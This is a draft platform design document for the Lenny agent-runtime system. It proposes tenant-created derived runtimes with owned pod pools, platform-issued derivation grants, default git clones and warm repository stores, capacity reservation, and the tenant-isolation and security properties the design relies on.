# Tenant-derived runtimes

Status: `Draft`, revision 79, 2026-11-16. Programs: [v1](../programs/v1.md).

## Problem

§15.1 **REST API** reserves `POST /v1/admin/runtimes` and `POST /v1/admin/pools` to `platform-admin`. A `tenant-admin` can only update records its tenant holds an access row on. The owner wants a tenant admin able to create derived runtimes.

The immediate need comes from the rule [`0149-tenant-scoping-identity`, "Pods with no per-session policy"](../0149-tenant-scoping-identity/change.md#effective-policy), and from [that design's decision 15](../0149-tenant-scoping-identity/decisions.md#decisions). A pod with several slots refuses a session whose environment has anything of its own wherever `netagent` cannot attribute a connection to its slot, which is the fallback of [`0127-egress-and-git`](../0127-egress-and-git/decisions.md#decisions) decision 60, so an environment that needs such a runtime there uses a derived runtime with `oneSessionPerPod: true`. A tenant whose security team keeps its sessions off shared pods (`placement.allowSharedPod: false` under [TSS-6](../0150-tenant-security-settings/change.md#tss-6-placement-settings)) needs the same. Today each such environment needs an operator's action, and that way does not work even for an operator (see "Current state").

The capability is general. A tenant admin can also add default workspace files, setup commands, an agent interface, labels, and narrower limits to a runtime the platform has made available.

## Scope

This design covers tenant-created derived runtimes, the pools they need, the grant that turns the capability on, the fields a tenant can set, default git clones, capacity reservation, the base runtime lifecycle, and the interactions with environments, runtime routes and revisions, delegation, and security oversight.

These are out of scope:

- A tenant registering its own image or a standalone runtime.
- Sharing a tenant-derived runtime with another tenant, or deriving from one.
- Egress ceilings, overlays, and per-class gates, which [`0127-egress-and-git`](../0127-egress-and-git/change.md) owns, security roles and the tenant security record, which [`0142-security-oversight`](../0142-security-oversight/change.md) owns, and environment scoping, which [`0149-tenant-scoping-identity`](../0149-tenant-scoping-identity/change.md) owns.

## Terms

| Term | Meaning |
| :-- | :-- |
| Tenant-derived runtime | A derived runtime that a `tenant-admin` creates under a derivation grant. It is stored in a tenant-scoped table, named under the tenant's name prefix, served by its own owned pool, and visible to its tenant alone. See DR-4. |
| Platform-derived runtime | A derived runtime that a `platform-admin` registers through `POST /v1/admin/runtimes`, stored with the platform's runtime records as today. |
| Base runtime, or base | The runtime a derived runtime names in `baseRuntime`. For a tenant-derived runtime it is a platform-written standalone runtime that a grant entry lists. |
| Derivation grant, or grant | The per-tenant record a `platform-admin` writes through `PUT /v1/admin/tenants/{id}/derivation-grant`. It holds the tenant's name prefix, its budgets `maxRuntimes` and `maxOwnedPods`, its upload limit `maxAssetUploadBytes`, and its grant entries. See "Who turns it on". |
| Grant entry, or base entry | One item of a grant's `bases` list. It names a base the tenant may derive from, the template pool, the resource classes, the grant flags, the warm store and reservation allowances, the limit on default clones and `gitRepository` assets, the bound on the warm-up checkout timeout, `ownedOverlays`, and an optional `retireAt`. |
| Grant flags | `allowWorkspaceFiles`, `allowSetupCommands`, `allowGitClones`, `allowGitCloneWrites`, and `allowAssets` on a grant entry. Each is off by default, and each admits one kind of tenant default. |
| Template pool | A platform pool backed by the base, which a grant entry names. An owned pool copies from it every setting that needs a platform decision. See "Template copy". |
| Owned pool | The pool created with a tenant-derived runtime, under the same name. Its row carries `ownerTenantId`, and its pods serve the owning tenant alone. See DR-5. |
| Name prefix (`namePrefix`) | A string the platform assigns to each granted tenant. A tenant-derived runtime is named `<namePrefix>--<suffix>`, such as `acme--chat-payments`, and `--` is reserved for this use. See "Names". |
| Tenant view | The read interface on `runtimestore` that takes a tenant: `Resolve(ctx, tenantID, name)` and `List(ctx, tenantID)`. It sees the platform runtimes the tenant holds `runtime_tenant_access` on and the tenant's own runtimes. See "Reading". |
| Effective runtime | The result of merging a tenant-derived runtime with its live base and its current grant entry, which the tenant view computes on each resolve. See DR-6. |
| `baseStatus` | What `GET /v1/admin/derived-runtimes/{name}` reports about the base. `retiring` carries a retirement date. `retired` means the date has passed. `incompatible` means the live base or grant entry no longer admits the runtime's settings. Under `retired` and `incompatible`, new sessions answer `409 DERIVED_RUNTIME_UNAVAILABLE`. |
| Tenant defaults | Default files, default setup commands, and default git clones that a tenant writes in a tenant-derived runtime's `workspaceDefaults`. Every session on the runtime receives them, and each kind is treated as code execution at the slot UID. See "Tenant defaults". |
| Default clone | An entry of `workspaceDefaults.gitClones`: a git repository that every session on the runtime clones. Its `write` field decides whether a session can push to it: `none`, the default, adds no push access, `clientOptIn` lets a session push when its plan sets `writeDefaultClones: true`, and `always` lets every session on the runtime push within the clone's `allowedRefPatterns`. See DR-9 and "Write scope". |
| Store, fill, and `gitRepository` asset | A `gitRepository` entry of a runtime's `sharedAssets` is the only way to declare a warm store. Before a pod reports ready, the `lenny-store-fill` container fills a store for each entry on the pool's warm list: a read-only bare repository holding the objects of one commit. A session's `gitClone` source of that repository then fetches only the commits the store lacks. An operator declares public entries on a Runtime, and a tenant admin declares entries on a tenant-derived runtime, which this document calls `gitRepository` assets. See "Warm stores". In this document a bare "store" means a warm store. The runtime store interface (`runtimestore`), a pool's row in `pools`, and the git mirror's per-tenant caches are always named as such. |
| Warm list | The one list of repository stores that a pool's pods fill before they report ready, kept per pool and, once [`0140-runtime-revisions`](../0140-runtime-revisions/change.md) lands, per pool and runtime revision, because a revision's `sharedAssets` contributes entries ([RV-3](../0140-runtime-revisions/change.md#rv-3-pods)). Every pre-filled store on a pod comes from its pod set's list. Each entry records the repository URL, the ref (a branch, a tag, or a full commit), the declarer, and whether it carries `prestage: true`. One rule set governs every entry, whoever declared it. The PoolScalingController renders the list on `PodSet.spec.warmClones` for every pool, and the decision service and the Token Service read it from the pool row. See "Warm list" under "Warm stores". |
| Declarer | Who put an entry on a warm list: `platform` for a public `gitRepository` entry on a base Runtime, and for a `gitRepository` asset of a tenant-derived runtime the role that wrote it, `tenant` for a tenant admin's asset and `platform` for a `platform-admin`'s asset, which keeps the protections decision 35 gives an operator's entry. |
| Tenant shared assets | The `sharedAssets` entries of a tenant-derived runtime, which render on its owned pool alone: `inline` and `artifact` files under `/lenny/assets`, appended to the base's, and `gitRepository` assets. See "Tenant shared assets" under DR-9. |
| Prestaged tree | The working tree that the warm-up checkout builds in each idle slot for a warm-list entry with `prestage: true`. At bind the first `gitClone` source of the session's workspace that the entry's store serves adopts it by rename to that source's `path`. See "Warm-up checkout and reflink rebuild" under "Warm stores". |
| `coveredStores` and `withheldStores` | Fields of a claim request, which the gateway also stores on the session row. `coveredStores` lists the stores of the tenant's entries whose read checks the session passed, plus the stores of public platform entries. `withheldStores` lists the stores whose read checks the session failed and that the adapter deletes for that session. A pod holding a store outside both lists is refused. The stored `coveredStores` also decides which platform chunk sets the session's checkpoints and exports may reference. See "Who reaches a store" and "Withheld stores". |
| Withheld store | A store whose read checks a session failed on a pod that serves that session alone. The adapter deletes it from the pod before anything runs for the session, the session proceeds without it, and the pod drains when the session ends. See "Withheld stores" under "Warm stores". |
| `oneSessionPerPod` | A tenant-derived runtime field. `true` gives the owned pool one session per pod and no recycling, whatever the template pool sets, and the field cannot return to `false`. See "`oneSessionPerPod` and `sessionPolicy`". |
| Served pod (`lenny.dev/served`) | A pod of an owned pool that has received a session. The gateway stamps the label at first assignment. See "Pods". |
| T, the tenant's charge | The pod figure checked against the grant's `maxOwnedPods`: the sum across the tenant's owned pools of `max(inUse, reservedPods) + warmCount + unusable`, where `inUse` counts a pool's pods in the `claimed` and `reserved` phases and `unusable` counts those in `draining` and `failed`, apart from a pod whose recorded fill failure is on a platform-declared warm-list entry. See "Bounds". The letter T means this charge alone in this document. |
| Reservation, floor, and allowance | A reservation keeps a minimum number of an owned pool's pods in existence before any session. The pool's `reservedPods` is its floor. A grant entry's `maxReservedPods` is the tenant's allowance per resource class. See DR-10. The word "reserved" also names a pod phase, which "Terms from other designs and the platform" defines, and that phase is unrelated to a reservation. |
| Marked pod | An `AgentPod` the WarmPoolController creates with `spec.reserved` set, whose pod takes the `lenny-reserved` priority class and counts against the reserved quota. See "Which pods are reserved". |
| `warm_stop_reasons` | A column on an owned pool row that lists why the pool must stop warming, such as a tenant suspension, a retirement, an emergency, or a security forbid. A non-empty value drains the pool. See "Who drains". |
| Retirement and emergency retirement | A retirement ends a base's use for tenant-derived runtimes after a notice period, 30 days by default. An emergency retirement takes effect at once, for a compromised image. See "Retirement" under DR-6. |
| `runtime.base_changed` | The audit event a platform write emits to each tenant whose tenant-derived runtime or stored overlay it changes. See "Notice" under DR-6. |
| DF-n and F-n.n.n | A DF-n is a defect in today's tree that verifying this design found. Each is filed in `BUILD-GAPS.md` at the repository root under an F-n.n.n identifier, the form every finding filed there takes. See "Defects found while verifying". |
| Draft 0111 | Draft proposal 0111, on the branch `draft/0111-warm-workspace`, which warms platform-written `gitRepository` entries of a runtime's `sharedAssets` into read-only stores on warm pods. Its rewrite defines the warm list for every pool to the requirements under "Relationship to draft proposal 0111", and this document cites these parts of its §14 rules for cache-served `gitClone` sources. Rule 2 validates a commit's tree and charges each blob at its size rounded up to 4,096 bytes plus 128 bytes per tree entry against `workspaceSizeLimitBytes`. Rule 3 builds the session's slot repository: `git init` in a new directory, the store's objects directory written to `objects/info/alternates`, a fetch of the commit, a detached checkout, and the config keys `lenny.gitStoreUrl`, the repository's normalized URL, and `lenny.baseCommit`, the commit it was built at. Rule 5, the capture copy, copies into a repository's own object store, before each checkpoint, every object it holds only through the store and needs. Rule 6, restore completion, runs after a checkpoint restore: it points alternates at the new pod's store, or removes them, and fetches `lenny.baseCommit` when that store differs. Rule 7, the lineage rule, lets a derived session's restore fetch through the pool of the session it was derived from, and the rewrite drops it if derive's copy of the stored plan leaves it no case. Rules 2, 3, 5, and 6 run in `lenny-materialize` as the slot UID ([WM-10](../0153-workspace-materialization/change.md#wm-10-git)). Warm stores build on it. See "Relationship to draft proposal 0111". |
| Spike | A hands-on test run to check a mechanism this design relies on. This design records one, the warm clone spike of 2026-11-05, under "Not verified" in DR-9. |
| Stop check | A narrow review of the changes in one revision, run to confirm that no Critical, High, or Major issue remains. "Review history" records each one. |
| Labels | Parts of the design carry the label DR-n. |

### Terms from other designs and the platform

This design builds on mechanisms other designs and the specification define. The table gives each one the meaning this document relies on.

| Term | Meaning |
| :-- | :-- |
| Runtime and runtime record | A registered agent runtime: its image, process, isolation profile, and session settings. Every runtime runs sessions on agent pods, one session per slot of a claimed pod, because [`0119-agent-runtimes-only`](../0119-agent-runtimes-only/change.md) removes `type: mcp` runtimes, service mode, and the `type` and `executionMode` fields. Its record is a row in `runtime_definitions`, and a runtime the chart deploys also has a `Runtime` custom resource ([§5.1](../../spec/05_runtime-registry-and-pool-model.md#51-runtime)). The row's `registered` column records whether that resource passed the RuntimeReconciler's validation, and DR-4 refuses a session whose final runtime row is not `registered`. |
| Derived runtime | A runtime record that names another runtime in `baseRuntime` and changes some of its fields under §5.1's merge rules ([§5.1 **Derived Runtime**](../../spec/05_runtime-registry-and-pool-model.md#derived-runtime)). Today only a `platform-admin` creates one. |
| `Runtime` resource | The Kubernetes custom resource for a runtime. The AgentPod controller reads it to build each pod. |
| Pool | A set of pre-started agent pods for one runtime. Its record, the pool row, is a row in `pools`, which the PoolScalingController renders as a Kubernetes custom resource (CRD), a `PodSet`, for each pod set of the pool, and each pod has an `AgentPod` resource. Pool settings include `sessionPolicy.maxConcurrentSessionsPerPod`, the number of sessions one pod serves at once, which also fixes the number of slot containers rendered per pod, the `recycle` block, which lets a pod serve another session after one ends, and `warmCount`, the number of idle pods kept ready. A CRD-only pool has the custom resources and no pool row, such as the embedded stack's `echo-pool-embedded`. `scalePolicy.scaleToZero` sets a cron window during which the pool keeps no warm pods. |
| Platform controllers | The PoolScalingController renders pool rows into `PodSet` resources and computes warm targets. The WarmPoolController creates and drains a pool's `AgentPod` resources. The AgentPod controller creates each pod. The RuntimeReconciler mirrors `Runtime` resources into runtime rows. |
| Pod phases | `AgentPod.status.phase`: `warming`, `idle`, `reserved`, `claimed`, `draining`, `failed`, and `terminated` ([§6.2](../../spec/06_warm-pod-model.md#62-pod-state-machine)). `reserved` is a recycled pod held for its pinned tenant for a short time after its session ends, which this document calls the reserved hold. |
| Concurrent pod and reused pod | A concurrent pod serves several sessions at once, one per slot, under `maxConcurrentSessionsPerPod` above 1. A reused pod is a concurrent pod or a pod on a recycling pool. A pool reuses pods when `poolstore.ReusesPods` reads true for it. |
| Acknowledgment | A pool field, such as `sessionPolicy.acknowledgeSharedPod`, by which a deployer accepts the risk a pool setting carries, such as slots sharing a pod's network and IPC namespaces, its adapter, and its `netagent` ([`0145-session-isolation`, "SI-10"](../0145-session-isolation/change.md#si-10-what-stays-shared)). |
| Pool recycle scrub | The cleanup §5.2 **Lenny scrub procedure** runs on a recycling pod between sessions. It is best effort. |
| `runtime_tenant_access` and `pool_tenant_access` | Rows by which a `platform-admin` gives a tenant access to a platform runtime or pool. This document calls each one an access row, and a bare "grant" always means a derivation grant. |
| Roles | `platform-admin` operates the deployment. `tenant-admin` administers one tenant. `tenant-viewer` reads one tenant's configuration. An environment `admin` is a member role inside one environment, below `tenant-admin` ([`0149-tenant-scoping-identity`](../0149-tenant-scoping-identity/change.md)). `security-admin` writes the tenant security record ([SO-1](../0142-security-oversight/change.md#so-1-security-roles)). |
| Row-level security | The Postgres trigger `lenny_tenant_guard` and policy `lenny_tenant_isolation`, which confine a tenant-scoped table to the transaction's tenant. `pgtenant.InTx` runs a transaction in one tenant's context, and `pgtenant.InAllTenants` in the platform's all-tenants context. |
| Adapter, slot, and slot UID | The adapter is Lenny's process in its own container of each agent pod. It runs at its own UID, holds the pod's projected service account token, deletes a withheld repository store, and reaches a slot's files only through that slot's supervisor ([SI-5](../0145-session-isolation/change.md#si-5-the-supervisor-file-descriptor-broker)). A slot is one of the places on a pod where a session runs, served by its own container, `runtime-<n>`, under its own unprivileged slot UID ([SI-1](../0145-session-isolation/change.md#si-1-pod-layout)). Each slot holds one session at a time. |
| Runtime supervisor | The platform program that is the first process of every slot container of every agent pod ([PL-1](../0118-agent-pod-layout/change.md#pl-1-pod-blueprint)). It launches the runtime's `command` for each session and runs setup commands and `lenny-materialize` at the slot UID on the adapter's request, over the channel `CH-SUPERVISE` ([§4.7.10](../../spec/04_system-components.md#4710-deployment-model)). The embedded deployment model, under which a runtime ran in the adapter's process, is removed ([PL-2](../0118-agent-pod-layout/change.md#pl-2-removal-of-the-embedded-deployment-model)). |
| Warm pod | A pod whose infrastructure is ready before any session: its containers are running, its repository stores are filled, and its warm-up checkouts are staged. Every runtime process launches at bind, after materialization and setup. |
| `lenny-materialize`, helper run | The platform's Go helper that a slot's supervisor runs as the slot UID to write a session's plan into `/workspace`, including every git step on a slot repository. One execution is a helper run, and a failed step reaches the adapter as a reason in the helper's slot-reported result ([`0153-workspace-materialization`](../0153-workspace-materialization/change.md)). |
| Warm-up checkout and reflink rebuild | At warm-up and after each slot release, `lenny-materialize` checks each warm-list entry with `prestage: true` out of its store into `/workspace/.lenny-prestage/<entry>`, with the index refreshed, and at bind it adopts the staged tree by rename for the first `gitClone` source of the session's workspace that the store serves. Under the reflink rebuild, one pristine checked-out tree per store sits in the store volume, and the helper creates the slot's files and clones their content with `FICLONE` where the filesystem supports it. The workspace materialization design owns both. |
| `lenny-store-fill` | An init container of every agent pod that renders a warm list. It runs after the `netagent` native sidecar, under its own UID, with no credentials and with only `lenny-git-stores` mounted read-write, and it fills each store and writes each pristine tree before the adapter and the slot containers start. The owner settled it on 2026-11-13 as decision 61 of [`0127-egress-and-git`](../0127-egress-and-git/decisions.md#decisions), so no platform-privileged process parses fetched git objects. |
| Platform chunk set, contribution, and eligible source | A platform chunk set holds the content chunks of one platform source: a warm repository store, from the working trees of its warm-up checkouts, or a runtime's shared assets. A pod that has never launched a session, meaning that no session has bound to any of its slots, contributes the content it staged. A tree staged for a warm-list entry feeds the set of the entry that staged it, so a tenant entry never feeds a platform-owned set. A session's checkpoints and exports may reference the chunks of its eligible sources instead of uploading them, and the gateway computes those sources from the session's stored `coveredStores` and its runtime revision at every checkpoint and export. A session of a tenant-derived runtime is eligible for its base's assets source, to which its owned pool's pods contribute the base's files, and for the tenant-owned assets set of the runtime's own `inline` and `artifact` assets, which those pods contribute as well ([`0131-incremental-checkpoint`, "Platform chunk sets"](../0131-incremental-checkpoint/change.md#platform-chunk-sets)). |
| Workspace plan and stored plan | A session's workspace plan lists its sources, such as `inlineFile` and `gitClone`, and its setup commands. The gateway composes the runtime's `workspaceDefaults` into it and stores the result on the session row, and every later materialization reads that stored plan ([§14](../../spec/14_workspace-plan-schema.md#14-workspace-plan-schema)). |
| `gitClone` source and `resolvedCommitSha` | A plan source that clones a git repository at a ref into a path. The gateway resolves the ref to a commit at bind and stores it as `resolvedCommitSha`. |
| Setup commands and `setupCommandPolicy` | Commands run in the pod before the agent starts. A runtime's `setupCommandPolicy` checks a client's commands against an `allowlist` or a `blocklist` of prefixes, and `shell` decides whether a command runs under a shell. A runtime's own default commands are exempt today ([§7.5](../../spec/07_session-lifecycle.md#75-setup-commands)). |
| Workspace | The slot's workspace volume, mounted directly at `/workspace` in the slot container. It is the session's working tree and the runtime's working directory, and no path carries the session's identifier ([PL-3](../0118-agent-pod-layout/change.md#pl-3-runtime-visible-filesystem-layout)). |
| Claim, bind, materialization, and finalize | A claim reserves a warm pod for a session, and bind attaches the session and its plan to it. Materialization writes the plan's sources into the pod's workspace. Finalize is the call that completes a session created without a plan. |
| Tenant pin, pool pin, pinned idle pod, and commit pin | The tenant pin is the `lenny.dev/tenant-id` label that ties a pod to one tenant, which `AdmitTenantPin` checks at claim, and the pin readers are the code that reads that label. A pool pin is a session request's `pool` field naming one pool, and a resolution with no pool pin picks a pool by runtime. A pinned idle pod is an idle pod that carries a tenant pin and has no claim, which §5.2 **Pinned idle inventory.** counts apart from the pool's other warm pods and bounds by the pinned idle bound. A commit pin resolves a `gitClone` ref to a full commit at bind (`PinCommitSHAs`), and a pinned commit is a full commit SHA. |
| Environment, E, and E = ∅ | An environment is a group of a tenant's users with its own policy, which admits runtimes through a label selector. Its policy can carry denies, hosts its sessions may not reach, and routes, which send matching hosts' traffic to a target such as a tenant's upstream proxy: an egress route carries API traffic, and a git route carries git traffic to a git endpoint, the mirror, or the host directly. A tenant has routes of its own as well. Elsewhere in this document a "way" or "path" means a means to an end, and "route" means an API route or one of these routes. E is the environment a session names, and E = ∅ marks a session that names none ([TS-1](../0149-tenant-scoping-identity/change.md#ts-1-environment-scoping)). |
| Transparent client | A client that creates sessions without naming an environment and sends no workspace plan, so its sessions take the runtime's defaults. |
| Pods with no per-session policy | The rule of [`0149-tenant-scoping-identity`, "Effective policy"](../0149-tenant-scoping-identity/change.md#effective-policy) under which a pod with several slots evaluates every session with E = ∅ where `netagent` cannot attribute a connection to its slot, so a session whose environment has a deny, a route, or another object of its own is refused there with `ENVIRONMENT_POLICY_NOT_ENFORCEABLE`. Where attribution holds, each slot's connections use its own session's scopes and environment, under decision 60 of [`0127-egress-and-git`](../0127-egress-and-git/decisions.md#decisions), which the owner settled on 2026-11-13. |
| `PreRoute` chain and post-chain point | The `PreRoute` chain is the single run of the gateway's `PreRoute` interceptors on every session creation path, which may change the runtime and the pool a session requested. The post-chain point is the step after that chain and after revision selection, and before the pod claim, at which every check that depends on the runtime, the revision, or the pool runs on the final runtime and pool and the chosen revision ([`0141-runtime-routing`, "Post-chain point"](../0141-runtime-routing/change.md#post-chain-point)). The final row is the session row as the post-chain point sees it. |
| Runtime route | A tenant's admin resource that sends the sessions requesting one runtime to target runtimes by weight, each target with an optional pool, applied by a built-in `PreRoute` interceptor ([`0141-runtime-routing`, "RT-4 Runtime routes"](../0141-runtime-routing/change.md#rt-4-runtime-routes)). Routes replace the experiments that [`0141-runtime-routing`](../0141-runtime-routing/change.md) removes, and they write no pool configuration. |
| Runtime revision, traffic, and pod set | A revision is an immutable, numbered copy of the runtime fields that define what runs in its pods, such as `image`, `requireSoPeercred`, `workspaceDefaults`, and `sharedAssets`. A runtime's traffic is its active revisions and their weights, and the gateway places each new session on one of them. A pod set is the warm pods of one pool built from one revision, and a pool keeps a pod set per active revision during a rollout ([`0140-runtime-revisions`](../0140-runtime-revisions/change.md), RV-1 to RV-3). A derived runtime has no revisions of its own, and a session on it runs a revision of its base, chosen by the base's traffic, with the derived runtime's fields merged over it ([RV-5](../0140-runtime-revisions/change.md#rv-5-derived-runtimes)). A retired revision is unrelated to this design's base retirement. |
| Rollout | The procedure that moves a runtime's traffic from one revision to another and deletes the old revision's pod sets ([`0140-runtime-revisions`, "RV-4 Rollout"](../0140-runtime-revisions/change.md#rv-4-rollout)). Its `automatic` policy warms the new revision's pod sets before it moves traffic, and waits for an owned pool's new pod set for at most `rollout.ownedPoolWarmTimeoutSeconds`. It replaces the pool-level `RuntimeUpgrade` of §10.5. |
| Delegation | A session can start child sessions, each on the runtime the delegation names, and a parent can export files to its child. A client's `delegationLease` narrows what the session's children may receive, such as their depth (`maxDepth`), and a `DelegationPolicy` lists the targets a parent may delegate to, by label or by an `ids` list of names. Isolation monotonicity requires a child's isolation profile to be at least as restrictive as its parent's ([§8.3](../../spec/08_recursive-delegation.md#83-delegation-policy-and-lease)). |
| Derive | A route that creates a new session from an existing one, defined in [`0144-session-derive`](../0144-session-derive/change.md). It replaces the former replay route. `from: latest` starts from the source's latest snapshot, and `from: start` starts from the source's stored plan at the same git commits. |
| `netagent` | A container in every agent pod that acts as the pod's egress proxy. It terminates TLS for hosts that carry a credential, attaches credentials, and enforces git paths and ref patterns. |
| `lenny-egress` and the decision service | `lenny-egress` is the central egress proxy through which agent traffic leaves the cluster. The decision service, `lenny-egress-authz`, decides whether each connection is allowed and which route it takes. |
| Token Service | The Lenny service that stores provider credentials and mints short-lived tokens from them ([§4.3](../../spec/04_system-components.md#43-token-service)). |
| Git mirror | `lenny-git-mirror`, the egress design's service that serves git fetches from per-tenant mirror caches, which the egress design calls stores, with a prefetch resource that fetches a repository ahead of any session. Draft 0111 placed a mirror in the gateway, which the egress design removes, and "the gateway's mirror" in this document means that one. |

## High-level design

Lenny runs agent sessions on runtimes, and each runtime has pools of pre-started pods that sessions claim. Today only the platform operator can create a runtime or a pool. A tenant that needs a variant of a runtime the operator shares has to ask the operator each time, for example when one team's environment needs pods that serve a single session so that the team's network policy can apply, or when every session should start with the tenant's own files, tools, and repositories. The current code also lets a tenant administrator edit a shared runtime or pool in ways that reach other tenants, and several of the checks that should keep tenants apart are missing.

This design first closes those gaps. It then lets a tenant administrator create a derived runtime: a copy of a runtime the operator has made available to that tenant, whose settings the tenant can only narrow, with optional files, setup commands, and git repositories that every session on it receives. Each such runtime gets its own pool, copied from a pool the operator chose, whose pods serve that tenant alone. The operator turns the capability on per tenant, sets how many pods each tenant may hold, and can let a tenant reserve pods so that they exist before any session needs them. The main limit is that anything a tenant administrator adds to a runtime runs as code in every session on it, so a stolen tenant administrator account reaches the credentials of that tenant's sessions. Each kind of addition therefore needs its own grant from the operator, and the tenant's security team can forbid it.

The rest of this section states each part in the design's terms, which "Terms" above defines.

**Prerequisites (DR-1 to DR-3).** DR-1 removes every `tenant-admin` write on platform-global runtimes and pools, makes session create, discovery, and delegation read `runtime_tenant_access`, implements the bootstrap seed's `tenantAccess`, and reserves `--` in names. DR-2 lets a pool on a derived runtime create pods, through `podRuntimeRef`, which points the AgentPod controller at the base's `Runtime` resource. DR-3 runs setup commands in the slot container at the slot UID through the runtime supervisor, away from the adapter's service account token, as [SI decision D6](../0145-session-isolation/decisions.md#decisions) states for every slot. Each fixes today's tree whether or not the rest lands.

**Records, names, and the grant (DR-4).** Tenant-derived runtimes live in `tenant_runtime_definitions`, a table under row-level security, so a query with no tenant context sees none of them. Every name carries the tenant's name prefix, so names stay unique across the deployment. Every session path reads runtimes through the tenant view, whose type replaces the plain runtime store interface so that a missed site does not compile. A `platform-admin` writes a derivation grant per tenant, which lists the bases and template pools the tenant may use, the grant flags, and the budgets. New routes under `/v1/admin/derived-runtimes` carry the tenant's writes, and "Fields" states what a tenant can set on each field.

**Owned pools (DR-5).** Each tenant-derived runtime has one owned pool. It copies every setting that needs a platform decision from the template pool, and a template write updates the copies in the same transaction. A tenant's one choice over concurrency and recycling is `oneSessionPerPod`. The controller stamps the owner on each pod at creation, and `lenny.dev/served` tells the code that reads the tenant pin which pods have served a session. The tenant's charge T bounds the pods a tenant holds, and a deployment total bounds the sum of the grants.

**Base changes (DR-6).** A platform write to a base or a template succeeds whatever tenant-derived runtimes exist, apart from the deletions that DP9 under "Security properties" names. The labels R-n and DP-n name this design's requirements and security properties, which those sections list. The tenant view merges each tenant-derived runtime with the live base and grant entry on every resolve, so a change that the runtime no longer meets reads as `incompatible`. An outbox delivers `runtime.base_changed` to each affected tenant, and a retirement gives tenants notice, apart from an emergency path.

**Default git clones, shared assets, and warm stores (DR-9 and DR-11).** A tenant can name repositories that every session clones. A default clone holds no credential and passes the same checks as a client's `gitClone` source on every path that composes it. Its `write` field decides whether a session can push to it without the client naming it. Where the operator allows it on the deployment and in the tenant's grant, a tenant can also add read-only files under `/lenny/assets` and `gitRepository` assets to its runtime's `sharedAssets`. A `gitRepository` asset that a platform admin writes on the runtime is the platform's, and the tenant cannot change it. A `gitRepository` asset fills a store on each warm pod of the owned pool, and any `gitClone` source of that repository, from the defaults or the plan, fetches only the commits the store lacks. With `prestage: true`, the warm-up checkout of the materialization design also stages the repository's working tree in each idle slot before bind, and the first such source adopts it. Every store on a pod comes from one warm list per pool, which holds the tenant's entries and the operator's public entries on the base under one rule set. A session reaches a tenant's store only after passing its read checks, and on a pod that serves one session a store whose check fails is deleted for that session. DR-11 has no section of its own: "Tenant shared assets" and "Warm stores" under DR-9 state it.

**Repository folders (DR-12).** Every repository a plan clones goes in its own subfolder of `/workspace`, and an optional `workingDirectory` names the folder the runtime starts in. DR-12 applies to sessions on every runtime.

**Capacity reservation (DR-10).** Where the operator and a platform admin allow it, a tenant sets a floor of pods on an owned pool. The floor holds against other pools through a split namespace quota and, optionally, the reserved overlay of the placement design, which places reserved pods on nodes within the pool's node class. No reservation preempts or evicts another pod.

**Interactions, oversight, and records (DR-8 and DR-7).** Environments see only runtimes the tenant can reach, a runtime route reaches only runtimes and pools the tenant can use, and delegation resolves through the tenant view. Every check on the runtime and pool runs at the post-chain point, on the final row and the chosen base revision. The tenant security record gains `derivedRuntimes.forbid`, posture reports each tenant-derived runtime, and audit events carry each default command's full text.

```
 platform-admin ──(derivation grant: bases, template pools, flags, budgets)──> Gateway
 tenant-admin ───(POST /v1/admin/derived-runtimes)──────────────────────────> Gateway
                                                                                │ one transaction
                                     tenant_runtime_definitions + owned pool row (copied from the template pool)
                                                                                │
                                              PoolScalingController: PodSet (podRuntimeRef, warmClones)
                                                                                │
                     WarmPoolController and AgentPod controller: pods built from the base's Runtime resource,
                                          labelled for the owner, stores filled and checkouts staged before ready
                                                                                ▲
 Session create ──> Gateway: tenant view resolves the name, composes defaults, runs clone checks ──> claim
```

## Requirements

- R1. A `tenant-admin` holding the platform's grant can create, update, and delete a derived runtime of a base the grant names, with no `platform-admin` action per runtime.
- R2. A tenant admin can give an environment one-session pods of a runtime whose shared pool serves concurrent sessions.
- R3. Another tenant cannot see, name, use, collide with, or be affected by a tenant-derived runtime.
- R4. Nothing a tenant sets widens what the base and the platform allow: image, process, isolation, egress ceiling, credential delivery, or command policy.
- R5. The platform bounds the pods each tenant's derived runtimes hold, warm and active, and those bounds sum to no more than a deployment total the operator sets. Nodes and the namespace `ResourceQuota` stay shared with every other pool, so R5 limits what owned pools take and reserves nothing. R10 states reservation.
- R6. A tenant-derived runtime blocks no platform write, apart from the exceptions DP9 states, and a platform change does not strand a tenant without notice, apart from a stated emergency path.
- R7. A tenant's security team can forbid the capability and can see what it produced.
- R8. A deployment that issues no grant behaves as it does today, apart from the defect fixes in DR-1 to DR-3.
- R9. A tenant admin can define default workspace files, setup commands, and git clones on a derived runtime, each under its own grant flag, and a default clone can give a session push access to its repository with no repository name from the client. Where the operator allows it on the deployment and the grant entry sets `allowAssets`, a tenant admin can add read-only shared assets once DR-3 has landed. A tenant admin can warm a repository ahead of time on warm pods through a `gitRepository` asset, under `allowGitClones` and DR-3, and any session whose workspace clones that repository uses the store and, when the entry asks for it, a tree staged before bind.
- R10. Where the operator and the platform admin allow it, a tenant admin can reserve a minimum number of pods for a derived runtime. The pods exist before any session, other pools cannot take their share of the namespace quota, and with the placement design's reserved overlay on nodes the operator reserves, other pools cannot take their nodes. No reservation evicts another pod.

## Security properties

- DP1. A tenant-derived runtime's owner comes from the authenticated principal at create and never changes. No request field sets it.
- DP2. A tenant-derived runtime's row is readable only in a transaction carrying its tenant's context or the platform's all-tenants context. A query with no tenant context cannot see it.
- DP3. Every session path resolves a runtime name within the session's tenant, through an interface that cannot read another tenant's row. A tenant-view miss on the final row refuses the request, on any name, with one answer for an absent name and another tenant's name.
- DP4. A pod of an owned pool serves only the owner, from its creation to its end.
- DP5. The image, process, isolation profile, credential delivery mode, and egress ceiling of an owned pool's pods come from platform-written records.
- DP6. A tenant default, file or command, and a tenant's `inline`, `artifact`, or `gitRepository` asset are treated as code execution at the slot UID. Each is accepted only under its grant flag, `allowAssets` for `inline` and `artifact` assets and `allowGitClones` for a `gitRepository` asset, and only on a base whose setup runs at that UID, which DR-3 provides, so neither a tenant command nor a base command reading a tenant file runs with the adapter's identity. A command also passes the base's `setupCommandPolicy`, with `shell: false`.
- DP7. Budgets are platform-held. A tenant has no write path to its own grant.
- DP8. The capability adds no Kubernetes permission to the gateway, and no tenant input reaches a cluster-scoped resource.
